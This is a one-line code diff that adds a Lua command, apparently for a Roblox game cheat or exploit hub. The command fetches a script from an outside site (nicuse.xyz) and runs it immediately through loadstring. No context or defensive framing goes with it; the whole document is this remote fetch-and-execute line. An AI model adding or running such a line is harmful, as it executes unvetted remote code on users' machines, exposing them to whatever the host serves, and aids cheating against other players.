@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://nicuse.xyz/JujustuGame.lua"))()
